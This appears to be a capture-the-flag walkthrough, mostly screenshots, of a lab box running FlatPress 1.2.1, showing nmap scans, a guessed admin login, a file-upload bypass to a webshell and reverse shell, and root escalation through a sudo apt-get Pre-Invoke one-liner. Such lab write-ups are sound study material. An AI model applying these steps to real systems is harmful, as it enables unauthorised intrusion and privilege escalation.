# nmap
```
┌──(kali㉿kali)-[~/PG/press]
└─$ nmap -p- --min-rate 10000 192.168.240.29
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-25 04:23 EST
Nmap scan report for 192.168.240.29
Host is up (0.061s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8089/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 7.85 seconds
                                                                                                                                                
┌──(kali㉿kali)-[~/PG/press]
└─$ nmap -p 22,80,8089 -sCV 192.168.240.29     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-25 04:24 EST
Nmap scan report for 192.168.240.29
Host is up (0.040s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Lugx Gaming Shop HTML5 Template
|_http-server-header: Apache/2.4.56 (Debian)
8089/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-generator: FlatPress fp-1.2.1
|_http-title: FlatPress
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.07 seconds
```

![Pasted image 20250225172540](<0. Attachments/Pasted image 20250225172540.png>)

# web enum
![Pasted image 20250225173045](<0. Attachments/Pasted image 20250225173045.png>)

![Pasted image 20250225173100](<0. Attachments/Pasted image 20250225173100.png>)

![Pasted image 20250225173119](<0. Attachments/Pasted image 20250225173119.png>)

guessed password
admin - password

![Pasted image 20250225173239](<0. Attachments/Pasted image 20250225173239.png>)

# exploit
[Flatpress 1.2.1 - File upload bypass to RCE Vulnerebility · Issue #152 · flatpressblog/flatpress](https://github.com/flatpressblog/flatpress/issues/152)

![Pasted image 20250225173441](<0. Attachments/Pasted image 20250225173441.png>)

trying payload
![Pasted image 20250225173510](<0. Attachments/Pasted image 20250225173510.png>)

![Pasted image 20250225173648](<0. Attachments/Pasted image 20250225173648.png>)

![Pasted image 20250225173709](<0. Attachments/Pasted image 20250225173709.png>)

![Pasted image 20250225173740](<0. Attachments/Pasted image 20250225173740.png>)

we have webshell
![Pasted image 20250225173820](<0. Attachments/Pasted image 20250225173820.png>)

# initial access
![Pasted image 20250225174209](<0. Attachments/Pasted image 20250225174209.png>)

adding a slight change
![Pasted image 20250225174229](<0. Attachments/Pasted image 20250225174229.png>)

upload
![Pasted image 20250225174259](<0. Attachments/Pasted image 20250225174259.png>)

go back to media manager click on rev.php
![Pasted image 20250225174342](<0. Attachments/Pasted image 20250225174342.png>)

have a nc ready and voila
![Pasted image 20250225174409](<0. Attachments/Pasted image 20250225174409.png>)

# priv esc enum
getting linpeas
![Pasted image 20250225174639](<0. Attachments/Pasted image 20250225174639.png>)

![Pasted image 20250225175951](<0. Attachments/Pasted image 20250225175951.png>)
```
sudo -l
```

![Pasted image 20250225180151](<0. Attachments/Pasted image 20250225180151.png>)

# priv esc and proof.txt
![Pasted image 20250225180310](<0. Attachments/Pasted image 20250225180310.png>)

```
sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```
